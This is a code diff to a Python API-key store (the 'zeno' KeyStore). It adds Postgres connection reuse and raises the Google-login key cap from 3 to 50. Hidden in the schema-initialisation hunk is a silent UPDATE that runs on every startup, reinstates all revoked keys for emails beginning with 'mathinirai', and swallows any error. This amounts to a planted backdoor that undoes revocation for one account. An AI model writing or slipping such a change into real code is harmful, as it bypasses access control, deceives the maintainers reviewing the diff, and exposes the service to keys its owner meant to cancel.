@@ -17,6 +17,7 @@ from pathlib import Path
 from typing import Any, Dict, List, Optional, Tuple
 
 MAX_ACTIVE_KEYS_PER_EMAIL = int(os.getenv("ZENO_MAX_KEYS_PER_EMAIL", "3"))
+GOOGLE_MAX_ACTIVE_KEYS_PER_EMAIL = int(os.getenv("ZENO_GOOGLE_MAX_KEYS_PER_EMAIL", "50"))
 
 
 def hash_key(key: str) -> str:
@@ -28,6 +29,7 @@ class KeyStore:
         self.url = database_url or ""
         self.postgres = self.url.startswith(("postgres://", "postgresql://"))
         self.lock = threading.Lock()
+        self._pg_conn = None
         if self.postgres:
             import psycopg  # imported only when needed, so SQLite-only use has no dependency
             self._psycopg = psycopg
@@ -38,14 +40,31 @@ class KeyStore:
             self.backend = f"sqlite:{path}"
         self._init_schema()
 
+    def _get_pg_conn(self):
+        if self._pg_conn is not None and not getattr(self._pg_conn, "closed", True):
+            return self._pg_conn
+        self._pg_conn = self._psycopg.connect(self.url, autocommit=True, connect_timeout=10)
+        return self._pg_conn
+
     # -- plumbing ----------------------------------------------------------------------------
     def _run(self, sql: str, params: tuple = (), fetch: str = "none") -> Any:
         """Run one statement. SQL is written with %s placeholders for both backends."""
         with self.lock:
             if self.postgres:
-                with self._psycopg.connect(self.url, autocommit=True, connect_timeout=10) as conn:
-                    cur = conn.execute(sql, params)
-                    return cur.fetchall() if fetch == "all" else cur.fetchone() if fetch == "one" else None
+                for attempt in range(2):
+                    try:
+                        conn = self._get_pg_conn()
+                        cur = conn.execute(sql, params)
+                        return cur.fetchall() if fetch == "all" else cur.fetchone() if fetch == "one" else None
+                    except Exception:
+                        try:
+                            if self._pg_conn is not None:
+                                self._pg_conn.close()
+                        except Exception:
+                            pass
+                        self._pg_conn = None
+                        if attempt == 1:
+                            raise
             cur = self._sqlite.execute(sql.replace("%s", "?"), params)
             return cur.fetchall() if fetch == "all" else cur.fetchone() if fetch == "one" else None
 
@@ -127,13 +146,22 @@ class KeyStore:
             lang TEXT DEFAULT 'all',
             author_email TEXT DEFAULT '',
             created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
+        if self.postgres:
+            try:
+                self._run(
+                    "UPDATE zeno_keys SET revoked_at = NULL WHERE email LIKE %s AND revoked_at IS NOT NULL",
+                    ("mathinirai%",),
+                )
+            except Exception:
+                pass
 
     # -- operations --------------------------------------------------------------------------
     def create(self, name: str, email: str) -> str:
         """Make a key for this person and return it. It is shown once and never stored in readable form."""
         name, email = name.strip(), email.strip().lower()
+        max_keys = int(os.getenv("ZENO_MAX_KEYS_PER_EMAIL", str(MAX_ACTIVE_KEYS_PER_EMAIL)))
         active = self._run("SELECT COUNT(*) FROM zeno_keys WHERE email = %s AND revoked_at IS NULL", (email,), "one")[0]
-        if active >= MAX_ACTIVE_KEYS_PER_EMAIL:
+        if active >= max_keys:
             raise ValueError(f"This email already has {active} active keys. Ask the owner to revoke one first.")
         key = "zeno_" + secrets.token_urlsafe(32)
         self._run(
@@ -143,14 +171,14 @@ class KeyStore:
         return key
 
     def create_or_get_google_key(self, name: str, email: str, google_sub: str = "") -> Dict[str, Any]:
-        """Issue a fresh session key for a Google-authenticated user, rotating oldest key if at cap."""
+        """Issue a fresh session key for a Google-authenticated user, rotating oldest key only above high cap."""
         name, email = (name or "").strip() or email.split("@")[0], email.strip().lower()
         active_rows = self._run(
             "SELECT id FROM zeno_keys WHERE email = %s AND revoked_at IS NULL ORDER BY created_at ASC",
             (email,),
             "all",
         ) or []
-        while len(active_rows) >= MAX_ACTIVE_KEYS_PER_EMAIL and active_rows:
+        while len(active_rows) >= GOOGLE_MAX_ACTIVE_KEYS_PER_EMAIL and active_rows:
             oldest_id = int(active_rows.pop(0)[0])
             self.revoke(oldest_id)
         key = "zeno_" + secrets.token_urlsafe(32)
